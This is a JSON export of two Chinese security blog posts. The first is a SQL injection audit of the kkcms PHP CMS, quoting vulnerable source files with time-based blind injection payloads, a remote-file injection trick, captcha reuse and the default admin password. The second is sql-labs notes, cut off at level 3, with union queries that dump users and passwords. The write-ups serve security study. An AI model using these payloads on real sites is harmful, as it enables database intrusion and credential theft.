[{"id":"880e1af7df287b27c3dd9350df565202","title":"快看cms-sql注入审计","content":"\n\n安装：https://github.com/erichuang2015/kkcms\n直接安装 php5.6.9  数据库 kk\n先直接使用Seay扫描，接下来一个一个看扫描结果\nsql注入疑似点：book.php&lt;?php \ninclude(&#39;system&#x2F;inc.php&#39;);\nif(isset($_POST[&#39;submit&#39;]))&#123;\n\tif ($_SESSION[&#39;verifycode&#39;] !&#x3D; $_POST[&#39;verifycode&#39;]) &#123;\n\t\talert_href(&#39;验证码错误&#39;,&#39;book.php&#39;);\n\t&#125;\n    null_back($_POST[&#39;userid&#39;],&#39;请填写昵称&#39;);\n\tnull_back($_POST[&#39;content&#39;],&#39;请填写留言内容&#39;);\n\t$data[&#39;userid&#39;] &#x3D; $_POST[&#39;userid&#39;];\n\t$data[&#39;content&#39;] &#x3D;addslashes($_POST[&#39;content&#39;]);\n\t$data[&#39;time&#39;] &#x3D;date(&#39;y-m-d h:i:s&#39;,time());\n\t\n\t$str &#x3D; arrtoinsert($data);\n\t\t$sql &#x3D; &#39;insert into xtcms_book (&#39;.$str[0].&#39;) values (&#39;.$str[1].&#39;)&#39;;\n\t\techo $sql;\n\tif(mysql_query($sql))&#123;\n\nalert_href(&#39;留言成功!小的马上为您准备相关资源！&#39;,&#39;book.php&#39;);\n&#125;\nelse&#123;\nalert_back(&#39;抱歉！服务器好像开小差了呢！&#39;);\n\t&#125;\n\t\n\t\n&#125;\ninclude(&#39;template&#x2F;&#39;.$xtcms_bdyun.&#39;&#x2F;book.php&#39;);\n?&gt;\n\n一处失败sql注入，学习了一下insert注入，也不亏\ninsert注入，时间盲注：https://www.cnblogs.com/lixiongji/p/14035159.html\n在book.php留言处，userid看到没有过滤，尝试发现在包含文件的system\\library.php中对get，post，cookie，request都进行了一次addslashes过滤\n&lt;?php\n\nif (!defined(&#39;PCFINAL&#39;)) &#123;\n\texit(&#39;Request Error!&#39;);\n&#125;\nif (!get_magic_quotes_gpc()) &#123;\n\tif (!empty($_GET)) &#123;\n\t\t$_GET &#x3D; addslashes_deep($_GET);\n\t&#125;\n\tif (!empty($_POST)) &#123;\n\t\t$_POST &#x3D; addslashes_deep($_POST);\n\t&#125;\n\t$_COOKIE &#x3D; addslashes_deep($_COOKIE);\n\t$_REQUEST &#x3D; addslashes_deep($_REQUEST);\n&#125;\nfunction addslashes_deep($_var_0)\n&#123;\n\tif (empty($_var_0)) &#123;\n\t\treturn $_var_0;\n\t&#125; else &#123;\n\t\treturn is_array($_var_0) ? array_map(&#39;addslashes_deep&#39;, $_var_0) : addslashes($_var_0);\n\t&#125;\n&#125;\n\n在这里存在验证码复用漏洞，用burp发包修改验证码为页面验证码，burp默认不会加载js，就可以重复使用该验证码\n$_session存储在服务器端，$_cookie存储在浏览器\nhttps://www.cnblogs.com/muxiaoye/p/b6f559cf8e9ac31356fe70edab0629b9.html\naddfav.php和前面那个一样\nbplay.php  有一样，没想到，这里的id写法有问题，可以直接注入\nhttp://192.168.0.107:8084/bplay.php?play=1 and if(1=1,sleep(3),0);#\nmpaly.php发现会对$_GET传入的url进行一次base64解码，可能有点希望\nif ($_GET[&quot;url&quot;]) &#123;\n    $link &#x3D; base64_decode($_GET[&quot;url&quot;]);\n\n直接先看一种情况，如果有url参数，且$idd==2，将$link赋值给$fang\n之后直接mysql_query()\n$result1 &#x3D; mysql_query(&#39;select * from xtcms_vod_class where c_id&#x3D;&#39; . $d_parent . &#39; order by c_id asc&#39;);\n\n这里的$d_parent是哪里来的呢？全局搜索没发现那里定义了，调试发现这个值是未定义，真无语 。可能存在注入，只要可控，毕竟没有引号闭合。\nmplayo.php跟前面mplay.php代码一摸一样，这个值也是未定义，直接走，可能是别的文件包含的\nyoulian.php跟book.php一样\nadmin后台注入admin/cms_backup.php值不可控\nadmin/cms_zwcs.php经过了过滤\nadmin/getdata.php   有注入这个可能有点希望，但是这个文件没有包含数据库配置文件\n同时也没有登录验证，可以直接访问\n经过测试，找到了注入点。但是，有个问题，这里没有包括数据库配置文件，sql语句无法执行\n&lt;?php\ninclude(&#39;..&#x2F;system&#x2F;inc.php&#39;);  #为了方便验证特意加的\nif (isset($_GET[&#39;play&#39;])) &#123;\n\t$d_parent &#x3D; $_GET[&#39;d_parent&#39;];\n\t$d_player &#x3D; $_GET[&#39;d_player&#39;];\n\t$zhui &#x3D; $_GET[&#39;zhui&#39;];\n\t$player &#x3D; $_GET[&#39;play&#39;];\n\tif ($_GET[&#39;play&#39;] &#x3D;&#x3D; &#39;&#39;) &#123;\n\t\techo &#39;影片不能为空!&#39;;\n\t&#125;\n\t$d_parent &#x3D; $_GET[&#39;d_parent&#39;];\n\t$d_player &#x3D; $_GET[&#39;d_player&#39;];\n\t$zhui &#x3D; $_GET[&#39;zhui&#39;];\n\t$player &#x3D; base64_decode($_GET[&#39;play&#39;]);\n\t$tvinfo &#x3D; file_get_contents($player);\n\t$tvpm &#x3D; &#39;#&lt;h2&gt;(.*?)&lt;&#x2F;h2&gt;#&#39;;\n\t$tvzy &#x3D; &#39;#&lt;li&gt;主演：&lt;span&gt;(.*?)&lt;&#x2F;span&gt;&lt;&#x2F;li&gt;#&#39;;\n\t$tvtp &#x3D; &#39;#&lt;img class&#x3D;&quot;lazy&quot; src&#x3D;&quot;(.*?)&quot; alt&#x3D;&quot;(.*?)&quot; &#x2F;&gt;#&#39;;\n\t$tvzz &#x3D; &#39;#&lt;li&gt;&lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;copy_sel&quot; value&#x3D;&quot;(.*?)&quot; checked&#x3D;&quot;&quot; &#x2F;&gt;(.*?)&lt;&#x2F;li&gt;#&#39;;\n\t$jianjie &#x3D; &#39;#&lt;div class&#x3D;&quot;vodplayinfo&quot;&gt;(.*?)&lt;&#x2F;div&gt;#&#39;;\n\tpreg_match_all($jianjie, $tvinfo, $jjarr);\n\tpreg_match_all($tvzz, $tvinfo, $tvarr);\n\tpreg_match_all($tvpm, $tvinfo, $btarr);\n\tpreg_match_all($tvzy, $tvinfo, $zyarr);\n\tpreg_match_all($tvtp, $tvinfo, $tparr);\n\t$title &#x3D; $btarr[1];\n\t$tupian &#x3D; $tparr[1];\n\t$zhuyan &#x3D; $zyarr[1];\n\t$dizhi &#x3D; $tvarr[2];\n\t$jj &#x3D; $jjarr[1];\n\t$huiche &#x3D; &#39;\n&#39;;\n\tif (!empty($title)) &#123;\n\t\tforeach ($title as $key &#x3D;&gt; $video) &#123;\n\t\t\t$titile &#x3D; str_replace(&#39;&lt;!--片名开始--&gt;&#39;, &#39;&#39;, &quot;&#123;$title[$key]&#125;&quot;);\n\t\t\t$titile &#x3D; str_replace(&#39;&lt;!--片名结束--&gt;&#39;, &#39;&#39;, &quot;&#123;$titile&#125;&quot;);\n\t\t\t$jieshao &#x3D; str_replace(&#39;&lt;!--介绍开始--&gt;&#39;, &#39;&#39;, &quot;&#123;$jj[$key]&#125;&quot;);\n\t\t\t$jieshao &#x3D; str_replace(&#39;&lt;!--介绍结束--&gt;&#39;, &#39;&#39;, &quot;&#123;$jieshao&#125;&quot;);\n\t\t\t$zyan &#x3D; str_replace(&#39;&lt;!--主演开始--&gt;&#39;, &#39;&#39;, &quot;&#123;$zhuyan[$key]&#125;&quot;);\n\t\t\t$zyan &#x3D; str_replace(&#39;&lt;!--主演结束--&gt;&#39;, &#39;&#39;, &quot;&#123;$zyan&#125;&quot;);\n\t\t\t$pic &#x3D; str_replace(&#39;http:&#x2F;&#x2F;cj.baiwanzy.com&#x2F;LdgImg.php?url&#x3D;&#39;, &#39;&#39;, &quot;&#123;$tupian[$key]&#125;&quot;);\n\t\t\tforeach ($dizhi as $k &#x3D;&gt; $vurl) &#123;\n\t\t\t\tif (strpos($dizhi[$k], &#39;m3u8&#39;)) &#123;\n\t\t\t\t\t$m3u8[] &#x3D; $dizhi[$k] . $huiche;\n\t\t\t\t&#125; elseif (strpos($dizhi[$k], &#39;mp4&#39;)) &#123;\n\t\t\t\t\t$mp4[] &#x3D; $dizhi[$k] . $huiche;\n\t\t\t\t&#125; else &#123;\n\t\t\t\t\t$zhilian[] &#x3D; $dizhi[$k] . $huiche;\n\t\t\t\t&#125;\n\t\t\t&#125;\n\t\t\tif ($zhui &#x3D;&#x3D; 0) &#123;\n\t\t\t\t$_data[&#39;d_scontent&#39;] &#x3D; &#39;&#39; . implode(&#39;&#39;, $zhilian) . &#39;&#39;;\n\t\t\t&#125; elseif ($zhui &#x3D;&#x3D; 1) &#123;\n\t\t\t\t$_data[&#39;d_scontent&#39;] &#x3D; &#39;&#39; . implode(&#39;&#39;, $m3u8) . &#39;&#39;;\n\t\t\t&#125; elseif ($zhui &#x3D;&#x3D; 2) &#123;\n\t\t\t\t$_data[&#39;d_scontent&#39;] &#x3D; &#39;&#39; . implode(&#39;&#39;, $mp4) . &#39;&#39;;\n\t\t\t&#125;\n\t\t\t$_data[&#39;d_player&#39;] &#x3D; $d_player;\n\t\t\t$_data[&#39;d_name&#39;] &#x3D; $titile;\n\t\t\t$_data[&#39;d_zhuyan&#39;] &#x3D; $zyan;\n\t\t\t$_data[&#39;d_picture&#39;] &#x3D; $pic;\n\t\t\t$_data[&#39;d_content&#39;] &#x3D; $jieshao;\n\t\t\t$_data[&#39;d_parent&#39;] &#x3D; $d_parent;\n\t\t\t$str &#x3D; arrtoinsert($_data);\n\t\t\t$result &#x3D; mysql_query(&#39;select * from xtcms_vod where d_name&#x3D; &quot;&#39; . $titile . &#39;&quot;&#39;);\n\t\t\tif (mysql_fetch_array($result)) &#123;\n\t\t\t\t$sql &#x3D; &#39;update xtcms_vod set &#39; . arrtoupdate($_data) . &#39; where d_name&#x3D;&quot;&#39; . $titile . &#39;&quot;&#39;;\n\t\t\t\tif (mysql_query($sql)) &#123;\n\t\t\t\t&#125;\n\t\t\t\techo &#39;&lt;script&gt;alert(&quot;影片重复更新最新地址成功!&quot;);window.opener&#x3D;null;window.close();&lt;&#x2F;script&gt;&#39;;\n\t\t\t&#125; else &#123;\n\t\t\t\t$sql &#x3D; &#39;insert into xtcms_vod (&#39; . $str[0] . &#39;) values (&#39; . $str[1] . &#39;)&#39;;\n\t\t\t\tif (mysql_query($sql)) &#123;\n\t\t\t\t\techo &#39;&lt;script&gt;alert(&quot;影片采集成功!&quot;);window.opener&#x3D;null;window.close();&lt;&#x2F;script&gt;&#39;;\n\t\t\t\t&#125;\n\t\t\t&#125;\n\t\t&#125;\n\t&#125;\n&#125;\nif (isset($_POST[&#39;execute&#39;])) &#123;\n\tnull_back($_POST[&#39;id&#39;], &#39;请至少选中一项！&#39;);\n\t$s &#x3D; &#39;&#39;;\n\t$id &#x3D; &#39;&#39;;\n\tforeach ($_POST[&#39;id&#39;] as $value) &#123;\n\t\t$id .&#x3D; $s . $value;\n\t\t$s &#x3D; &#39;,&#39;;\n\t&#125;\n\tswitch ($_POST[&#39;execute_method&#39;]) &#123;\n\t\tcase &#39;srec&#39;:\n\t\t\t$sql &#x3D; &#39;update xtcms_vod set d_rec &#x3D; 1 where d_id in (&#39; . $id . &#39;)&#39;;\n\t\t\tbreak;\n\t\tcase &#39;crec&#39;:\n\t\t\t$sql &#x3D; &#39;update xtcms_vod set d_rec &#x3D; 0 where d_id in (&#39; . $id . &#39;)&#39;;\n\t\t\tbreak;\n\t\tcase &#39;shot&#39;:\n\t\t\t$sql &#x3D; &#39;update xtcms_vod set d_hot &#x3D; 1 where d_id in (&#39; . $id . &#39;)&#39;;\n\t\t\tbreak;\n\t\tcase &#39;chot&#39;:\n\t\t\t$sql &#x3D; &#39;update xtcms_vod set d_hot &#x3D; 0 where d_id in (&#39; . $id . &#39;)&#39;;\n\t\t\tbreak;\n\t\tcase &#39;delete&#39;:\n\t\t\t$sql &#x3D; &#39;delete from xtcms_vod where d_id in (&#39; . $id . &#39;)&#39;;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\talert_back(&#39;请选择要执行的操作&#39;);\n\t&#125;\n\tmysql_query($sql);\n\talert_href(&#39;执行成功!&#39;, &#39;cms_detail.php?cid&#x3D;0&#39;);\n&#125;\nif (isset($_POST[&#39;shift&#39;])) &#123;\n\tnull_back($_POST[&#39;id&#39;], &#39;请至少选中一项！&#39;);\n\t$s &#x3D; &#39;&#39;;\n\t$id &#x3D; &#39;&#39;;\n\tforeach ($_POST[&#39;id&#39;] as $value) &#123;\n\t\t$id .&#x3D; $s . $value;\n\t\t$s &#x3D; &#39;,&#39;;\n\t&#125;\n\tnull_back($_POST[&#39;shift_target&#39;], &#39;请选择要转移到的频道&#39;);\n\tmysql_query(&#39;update xtcms_vod set d_parent &#x3D; &#39; . $_POST[&#39;shift_target&#39;] . &#39; where d_id in (&#39; . $id . &#39;)&#39;);\n\talert_href(&#39;转移成功!&#39;, &#39;cms_detail.php?cid&#x3D;0&#39;);\n&#125;\n\n简化了一下，其中的include是我后面添加，为了方便验证注入是否成功\n&lt;?php\n\ninclude(&#39;system&#x2F;inc.php&#39;);\n$player &#x3D; base64_decode($_GET[&#39;play&#39;]);\n$tvinfo &#x3D; file_get_contents($player);\n&#x2F;&#x2F; $tvinfo &#x3D; &#39;&lt;h2&gt;&lt;!--片名开始--&gt;厉害了，我的国&quot; and if(1&#x3D;1,sleep(3),0);#&lt;!--片名结束--&gt;&lt;&#x2F;h2&gt;&#39;;\n$tvpm &#x3D; &#39;#&lt;h2&gt;(.*?)&lt;&#x2F;h2&gt;#&#39;;\npreg_match_all($tvpm, $tvinfo, $btarr);\n$title &#x3D; $btarr[1];\n\nif (!empty($title)) &#123;\n\tforeach ($title as $key &#x3D;&gt; $video) &#123;\n\t\t$titile &#x3D; str_replace(&#39;&lt;!--片名开始--&gt;&#39;, &#39;&#39;, &quot;&#123;$title[$key]&#125;&quot;);\n\t\t$titile &#x3D; str_replace(&#39;&lt;!--片名结束--&gt;&#39;, &#39;&#39;, &quot;&#123;$titile&#125;&quot;);\n\t\t&#x2F;&#x2F; $jieshao &#x3D; str_replace(&#39;&lt;!--介绍开始--&gt;&#39;, &#39;&#39;, &quot;&#123;$jj[$key]&#125;&quot;);\n\t\t&#x2F;&#x2F; $jieshao &#x3D; str_replace(&#39;&lt;!--介绍结束--&gt;&#39;, &#39;&#39;, &quot;&#123;$jieshao&#125;&quot;);\n\t\t&#x2F;&#x2F; $zyan &#x3D; str_replace(&#39;&lt;!--主演开始--&gt;&#39;, &#39;&#39;, &quot;&#123;$zhuyan[$key]&#125;&quot;);\n\t\t&#x2F;&#x2F; $zyan &#x3D; str_replace(&#39;&lt;!--主演结束--&gt;&#39;, &#39;&#39;, &quot;&#123;$zyan&#125;&quot;);\n\t\t&#x2F;&#x2F; $pic &#x3D; str_replace(&#39;http:&#x2F;&#x2F;cj.baiwanzy.com&#x2F;LdgImg.php?url&#x3D;&#39;, &#39;&#39;, &quot;&#123;$tupian[$key]&#125;&quot;);\n\t\t$result &#x3D; mysql_query(&#39;select * from xtcms_vod where d_name&#x3D; &quot;&#39; . $titile . &#39;&quot;&#39;);\n\t\t&#x2F;&#x2F; var_dump($result);\n\t\t$str&#x3D; &#39;select * from xtcms_vod where d_name&#x3D; &quot;&#39; . $titile . &#39;&quot;&#39;;\n\t\techo $str;\n\t\t&#x2F;&#x2F; $test&#x3D;mysql_query(&#39;select * from xtcms_vod where d_id&#x3D;4 and if(1&#x3D;1,sleep(3),0);#&quot;&#39;);\n\t\t&#x2F;&#x2F; echo $test;\n\t\t&#x2F;&#x2F; if (mysql_fetch_array($test)) &#123;\n\t\t&#x2F;&#x2F; \techo &#39;1111111&#39;;\n\t\t&#x2F;&#x2F; &#125;else&#123;\n\t\t&#x2F;&#x2F; \techo &#39;22222&#39;;\n\t\t&#x2F;&#x2F; &#125;\n\t&#125;\n&#125;\n?&gt;\n\n可以看到，通过get传入一个base64编码的参数play，这个play是一个远程链接，通过file_get_contents或去其中内容，来进行正则匹配，只要链接中的内容为我们构造的payload就能造成注入漏洞\nhttp://ip:xx.txt 内容\n&lt;h2&gt;&lt;!--片名开始--&gt;厉害了，我的国&quot; and if(1&#x3D;1,sleep(3),0);#&lt;!--片名结束--&gt;&lt;&#x2F;h2&gt;\n\n传入?play=base64encode(‘http://ip:xx.txt&#39;)，页面会延时3秒\n因为这个cms是个采集播放器，所以我开启了远程文件\n传入的是url所以过滤也就没什么用了\n现在就是找到包含了这个文件的文件，其中也包含了数据库配置文件，这样就能正常注入了\n找到了，可惜，只有后台的caijiapi.php\nadmin/caijiapi.php就看关键，包含了前面的漏洞php，同时也包含了数据库配置\n&lt;?php\ninclude(&#39;..&#x2F;system&#x2F;inc.php&#39;);\ninclude(&#39;cms_check.php&#39;);\nerror_reporting(0);\ninclude(&#39;getdata.php&#39;);\n\n同时，也包含了cms_check,php。这不就直接变鸡肋，尝试登录注入一下\n这个验证码能复用，就能爆破了。同时安装时不能设置管理员账号密码，默认管理员账号密码为admin，123456\n注入成功了，前面片名看网站有的片名写上去就行了\nallow_url_fopen 是on才行，这个也是默认开启的吧。\n\n后面那个switch里面的$id也能注，这个$id直接数字型就ok了\nadmin/youlian_edit.php 有但是没用这个文件和刚才那个一样，是被包含使用的，通过$_post传参，过滤了\n不过这个id好像有机会\n&lt;?php\n\nif (isset($_POST[&#39;save&#39;])) &#123;\n\t$_data[&#39;content&#39;] &#x3D; $_POST[&#39;content&#39;];\n\t$_data[&#39;Reply&#39;] &#x3D; $_POST[&#39;Reply&#39;];\n\t$sql &#x3D; &#39;update xtcms_youlian set &#39; . arrtoupdate($_data) . &#39; where id &#x3D; &#39; . $_GET[&#39;id&#39;] . &#39;&#39;;\n\tif (mysql_query($sql)) &#123;\n\t\talert_href(&#39;修改成功!&#39;, &#39;cms_youlian.php&#39;);\n\t&#125; else &#123;\n\t\talert_back(&#39;修改失败!&#39;);\n\t&#125;\n&#125;\n\n测试一下\n&lt;?php\n\ninclude(&#39;system&#x2F;inc.php&#39;);\nif (isset($_POST[&#39;save&#39;])) &#123;\n\t$_data[&#39;content&#39;] &#x3D; $_POST[&#39;content&#39;];\n\t$_data[&#39;Reply&#39;] &#x3D; $_POST[&#39;Reply&#39;];\n\t$sql &#x3D; &#39;update xtcms_youlian set &#39; . arrtoupdate($_data) . &#39; where id &#x3D; &#39; . $_GET[&#39;id&#39;] . &#39;&#39;;\n\techo $sql;\n\n&#125;\n?&gt;\n\n\n可以的，只要设置了友链，就能通过这个注入，设置一个友链看看效果\n但是。。。。你妹的，没有使用到这个文件，全局搜索发现包含的model/youlian_edit.php\n但是model下没有这个文件，这个不是有什么问题吧。model下只有youlian.php\n反正也是后台，无所谓了\nadmin/cms_youlian_edit.php这个跟上面那个一样，但是没用\nadmin/model/link_edit.php   有注入可能是版本切换还是什么，前面两个已经没用了，现在的友链是通过link_edit.php来实现的\n&lt;?php\n\nif (isset($_POST[&#39;save&#39;])) &#123;\n\tnull_back($_POST[&#39;l_name&#39;], &#39;请填写链接名称&#39;);\n\tnon_numeric_back($_POST[&#39;l_sort&#39;], &#39;排序必须是数字!&#39;);\n\t$data[&#39;l_name&#39;] &#x3D; $_POST[&#39;l_name&#39;];\n\t$data[&#39;l_logo&#39;] &#x3D; $_POST[&#39;l_logo&#39;];\n\t$data[&#39;l_url&#39;] &#x3D; $_POST[&#39;l_url&#39;];\n\t$data[&#39;l_sort&#39;] &#x3D; $_POST[&#39;l_sort&#39;];\n\t$sql &#x3D; &#39;update xtcms_link set &#39; . arrtoupdate($data) . &#39; where l_id &#x3D; &#39; . $_GET[&#39;l_id&#39;] . &#39;&#39;;\n\tif (mysql_query($sql)) &#123;\n\t\talert_href(&#39;链接修改成功!&#39;, &#39;cms_link.php&#39;);\n\t&#125; else &#123;\n\t\talert_back(&#39;修改失败!&#39;);\n\t&#125;\n&#125;\n\n这个在两个文件中使用到了\nadmin/cms_link_edit.php这个里面有一句\n$result &#x3D; mysql_query(&#39;select * from xtcms_link where l_id &#x3D; &#39;.$_GET[&#39;l_id&#39;].&#39;&#39;);\n\n更简单，直接传入l_id=2 and if(1=1,sleep(3),0) ，就注入了\nadmin/cms_link.php&lt;?php\n\t\t\t\t\t\t$result &#x3D; mysql_query(&#39;select * from xtcms_link&#39;);\n\t\t\t\t\t\twhile($row &#x3D; mysql_fetch_array($result))&#123;\n\t\t\t\t\t\t?&gt;\n\t\t\t\t\t\t&lt;tr&gt;\n\t\t\t\t\t\t\t&lt;td&gt;&lt;?php echo $row[&#39;l_sort&#39;]?&gt;&lt;&#x2F;td&gt;\n\t\t\t\t\t\t\t&lt;td&gt;\n\t\t\t\t\t\t\t\t&lt;?php if ($row[&#39;l_logo&#39;] !&#x3D; &#39;&#39;) &#123; ?&gt;\n\t\t\t\t\t\t\t\t&lt;a href&#x3D;&quot;&lt;?php echo $row[&#39;l_logo&#39;]?&gt;&quot; target&#x3D;&quot;_blank&quot;&gt;&lt;img src&#x3D;&quot;&lt;?php echo $row[&#39;l_logo&#39;]?&gt;&quot; width&#x3D;&quot;120&quot; height&#x3D;&quot;30&quot; &#x2F;&gt;&lt;&#x2F;a&gt;\n\t\t\t\t\t\t\t\t&lt;?php &#125; ?&gt;\n\t\t\t\t\t\t\t&lt;&#x2F;td&gt;\n\t\t\t\t\t\t\t&lt;td&gt;&lt;?php echo $row[&#39;l_name&#39;]?&gt;&lt;&#x2F;td&gt;\n\t\t\t\t\t\t\t&lt;td&gt;&lt;?php echo $row[&#39;l_url&#39;]?&gt;&lt;&#x2F;td&gt;\n\t\t\t\t\t\t\t&lt;td&gt;&lt;a class&#x3D;&quot;btn btn-info&quot; href&#x3D;&quot;cms_link_edit.php?l_id&#x3D;&lt;?php echo $row[&#39;l_id&#39;]?&gt;&quot;&gt;&lt;span class&#x3D;&quot;icon-edit&quot;&gt; 修改&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&amp;nbsp &lt;a class&#x3D;&quot;btn btn-danger&quot; href&#x3D;&quot;cms_link.php?del&#x3D;&lt;?php echo $row[&#39;l_id&#39;]?&gt;&quot; onclick&#x3D;&quot;return confirm(&#39;确认要删除吗？&#39;)&quot;&gt;&lt;span class&#x3D;&quot;icon-times&quot;&gt; 删除&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;\n\t\t\t\t\t\t&lt;&#x2F;tr&gt;\n\n使用语句查询link的结果，这个直接过\n这个文件包含了\nadmin/model/link.php&lt;?php\n\nif (isset($_GET[&#39;del&#39;])) &#123;\n\t$sql &#x3D; &#39;delete from xtcms_link where l_id &#x3D; &#39; . $_GET[&#39;del&#39;] . &#39;&#39;;\n\tif (mysql_query($sql)) &#123;\n\t\talert_href(&#39;删除成功!&#39;, &#39;cms_link.php&#39;);\n\t&#125; else &#123;\n\t\talert_back(&#39;删除失败！&#39;);\n\t&#125;\n&#125;\nif (isset($_POST[&#39;save&#39;])) &#123;\n\tnull_back($_POST[&#39;l_name&#39;], &#39;请填写链接名称&#39;);\n\tnon_numeric_back($_POST[&#39;l_sort&#39;], &#39;排序必须是数字!&#39;);\n\t$data[&#39;l_name&#39;] &#x3D; $_POST[&#39;l_name&#39;];\n\t$data[&#39;l_logo&#39;] &#x3D; $_POST[&#39;l_logo&#39;];\n\t$data[&#39;l_url&#39;] &#x3D; $_POST[&#39;l_url&#39;];\n\t$data[&#39;l_sort&#39;] &#x3D; $_POST[&#39;l_sort&#39;];\n\t$str &#x3D; arrtoinsert($data);\n\t$sql &#x3D; &#39;insert into xtcms_link (&#39; . $str[0] . &#39;) values (&#39; . $str[1] . &#39;)&#39;;\n\tif (mysql_query($sql)) &#123;\n\t\t$order &#x3D; mysql_insert_id();\n\t\tif ($_POST[&#39;l_sort&#39;] &#x3D;&#x3D; 0) &#123;\n\t\t\tmysql_query(&#39;update xtcms_link set l_sort &#x3D; &#39; . $order . &#39; where l_id &#x3D; &#39; . $order);\n\t\t&#125;\n\t\talert_href(&#39;链接添加成功!&#39;, &#39;cms_link.php&#39;);\n\t&#125; else &#123;\n\t\talert_back(&#39;添加失败!&#39;);\n\t&#125;\n&#125;\n\n跟前面一样，能够注入，但是用的是delete，直接过\nadmin/model/ad.php del&lt;?php\n\nif (isset($_GET[&#39;del&#39;])) &#123;\n\t$sql &#x3D; &#39;delete from xtcms_ad where id &#x3D; &#39; . $_GET[&#39;del&#39;] . &#39;&#39;;\n\tif (mysql_query($sql)) &#123;\n\t\talert_href(&#39;删除成功!&#39;, &#39;cms_ad.php&#39;);\n\t&#125; else &#123;\n\t\talert_back(&#39;删除失败！&#39;);\n\t&#125;\n&#125;\nif (isset($_POST[&#39;save&#39;])) &#123;\n\tnull_back($_POST[&#39;title&#39;], &#39;请填写广告名称&#39;);\n\t$data[&#39;title&#39;] &#x3D; $_POST[&#39;title&#39;];\n\t$data[&#39;pic&#39;] &#x3D; $_POST[&#39;pic&#39;];\n\t$data[&#39;catid&#39;] &#x3D; $_POST[&#39;catid&#39;];\n\t$str &#x3D; arrtoinsert($data);\n\t$sql &#x3D; &#39;insert into xtcms_ad (&#39; . $str[0] . &#39;) values (&#39; . $str[1] . &#39;)&#39;;\n\tif (mysql_query($sql)) &#123;\n\t\talert_href(&#39;广告添加成功!&#39;, &#39;cms_ad.php&#39;);\n\t&#125; else &#123;\n\t\talert_back(&#39;添加失败!&#39;);\n\t&#125;\n&#125;\n\n\ndelete注入\n后面的insert经过了过滤，无法注入\n在cms_ad.php中使用\ncms_ad.phpad_edit.php   有这里使用update，并且没有引号，直接注入\n&lt;?php\n\nif (isset($_GET[&#39;del&#39;])) &#123;\n\t$sql &#x3D; &#39;delete from xtcms_ad where id &#x3D; &#39; . $_GET[&#39;del&#39;] . &#39;&#39;;\n\tif (mysql_query($sql)) &#123;\n\t\talert_href(&#39;删除成功!&#39;, &#39;cms_ad.php&#39;);\n\t&#125; else &#123;\n\t\talert_back(&#39;删除失败！&#39;);\n\t&#125;\n&#125;\nif (isset($_POST[&#39;save&#39;])) &#123;\n\tnull_back($_POST[&#39;title&#39;], &#39;请填写广告名称&#39;);\n\t$data[&#39;title&#39;] &#x3D; $_POST[&#39;title&#39;];\n\t$data[&#39;pic&#39;] &#x3D; $_POST[&#39;pic&#39;];\n\t$data[&#39;url&#39;] &#x3D; $_POST[&#39;url&#39;];\n\t$data[&#39;catid&#39;] &#x3D; $_POST[&#39;catid&#39;];\n\t$sql &#x3D; &#39;update xtcms_ad set &#39; . arrtoupdate($data) . &#39; where id &#x3D; &#39; . $_GET[&#39;id&#39;] . &#39;&#39;;\n\tif (mysql_query($sql)) &#123;\n\t\talert_href(&#39;广告修改成功!&#39;, &#39;cms_ad.php&#39;);\n\t&#125; else &#123;\n\t\talert_back(&#39;修改失败!&#39;);\n\t&#125;\n&#125;\n\n在cms_ad_edit.php中使用\ncms_ad_edit.php直接传参就行了\nadmin\\model\\admin.php   deldel有，无用\nadmin\\model\\admin_edit.php  有一样，get传参，在cms_admin_edit.php中使用\nadmin\\model\\adwei.php  deladmin\\model\\app.php无\nadmin\\model\\book.php  有id传参\nadmin\\model\\book_edit.php  有id传参\nsystemsystem/library.php过\nsystem/playurl.php过\nsystem/shoufei.php过\n不看后台了，全一样的，全局搜索  .$_GET[‘   传参应该还有一堆，后面只看前台templatetemplate\\wapian\\vlist.php  有没有配置文件，找包含的地方\nucenter过\nwapwap\\bplay  有一样的直接传入id，同时文件里还有一个漏洞函数，使用这个函数的地方可能存在漏洞\nwap\\vlist.php  有直接传入cid\nwap\\pay\\return_url_shang.php  有直接传入\nwap\\pay\\return_url.php  有直接传入\n你妹的，后台一堆，前台很多滤了，干看了有正确的写法，将有的值给双引号包裹了，这里参数的id是数字型，作者考虑了可是写法出错了。\n被背刺了，没想到一样的模板里还能长出个不一样的花参考链接：https://mp.weixin.qq.com/s/udUKexH8gQsJY9thXJ_smQ\n在ucenter/reg.php中，有个奇葩操作，在通过addslashes过滤了，又使用stripslashes除去了转义的反斜杠   ！！！！！！！！\nucenter/reg.php&lt;?php \ninclude(&#39;..&#x2F;system&#x2F;inc.php&#39;);\nif(isset($_SESSION[&#39;user_name&#39;]))&#123;\nheader(&#39;location:index.php&#39;);\n&#125;;\n\t\nif(isset($_POST[&#39;submit&#39;]))&#123;\n$username &#x3D; stripslashes(trim($_POST[&#39;name&#39;]));\n&#x2F;&#x2F; 检测用户名是否存在\n$query &#x3D; mysql_query(&quot;select u_id from xtcms_user where u_name&#x3D;&#39;$username&#39;&quot;);\n\nstripslashes的作用就是除去不需要使用转义\\，真是奇葩\n剩下就是找用到这个函数的地方，也存在注入，然后就是包含漏洞文件的地方也存在注入\n小结：被这一手给惊呆了，以后注意\n吐槽：太菜了，只能啃一下老版本的cms，新版的项目有的实在是太大了，扫描都有几千个，完全看不过来\n","slug":"快看cms-sql注入审计","date":"2022-11-04T07:47:54.000Z","categories_index":"代码审计","tags_index":"PHP","author_index":"Longw"},{"id":"e7ef7d94b3e4c91873147e11ef254294","title":"sql-labs-less1-10","content":"\n\n什么理解总结都不如做题，做多了就有套路了\n答案：https://blog.csdn.net/elephantxiang/article/details/119684515\n全程无图less1： id=’$id’\n单引号报错，ordey by 字段为3\nunion注入需要前面是错误的内容\nuser() database() version()\ngroup_concat() 将所有结果当成一条返回\n获取所有表名\ngroup_concat(table_name) from information_schema.tables where table_schema=database() –+\n获取users表的所有字段名\ngroup_concat(column_name) from information_schema.columns where table_name=’users’ and table_schema=database() –+\n获取所有用户名和密码\ngroup_concat(username),group_concat(password) from users –+\nsql注入写入webshellhttps://blog.csdn.net/weixin_43749601/article/details/115280242\nless2：id=$id\nand 1=1， and 1=2\n不用闭合，直接注入 order by 3 –+ \n剩下的和less1一样\nless3：id=(‘$id’)\n使用 ‘) 闭合报错\n加上  –+ 注释  